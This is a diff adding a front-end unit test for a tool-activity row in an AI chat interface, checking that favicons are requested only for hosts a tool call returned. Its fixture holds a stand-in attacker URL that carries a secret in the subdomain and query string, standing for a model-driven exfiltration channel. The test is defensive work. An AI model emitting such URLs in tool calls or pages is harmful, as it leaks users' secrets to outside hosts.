@@ -98,6 +98,47 @@ describe("ToolActivityRow", () => {
 		expect(getByText("request timed out after 20 s")).toBeInTheDocument();
 	});
 
+	// docs/plans/exfil-channels: the favicon of a host the call returned is asked of the
+	// app's proxy; the host of an address the call was only GIVEN is the model's word,
+	// and the row shows the globe and asks for nothing.
+	it("asks for the favicon of a host a call returned, and shows the globe for one it was only given", () => {
+		const returned = render(ToolActivityRow, {
+			item: item({
+				name: "fetch_url",
+				input: { url: "https://met.ie/cork" },
+				candidates: [
+					{
+						id: "c1",
+						title: "Cork city forecast",
+						url: "https://met.ie/cork",
+						sourceType: "web",
+					},
+				] as ToolCallSegment["candidates"],
+			}),
+			open: true,
+		});
+		const favicon = returned
+			.getByTestId("tool-activity-body")
+			.querySelector<HTMLImageElement>(".act-favicon img");
+		expect(favicon?.getAttribute("src")).toBe("/api/favicon?domain=met.ie");
+		returned.unmount();
+
+		const given = render(ToolActivityRow, {
+			item: item({
+				name: "fetch_url",
+				input: { url: "https://secret-0123abcd.attacker.test/page?d=SECRET" },
+			}),
+			open: true,
+		});
+		const body = given.getByTestId("tool-activity-body");
+		expect(body.querySelector("a.act-src")).not.toBeNull();
+		expect(body.querySelector("img")).toBeNull();
+		expect(
+			body.querySelector(".act-favicon .act-favicon-globe"),
+		).not.toBeNull();
+		expect(body.innerHTML).not.toContain("/api/favicon");
+	});
+
 	it("is a button with a chevron only when it has a body, and toggles that body on click", async () => {
 		const onToggle = vi.fn();
 		const { getByTestId, queryByTestId, rerender } = render(ToolActivityRow, {
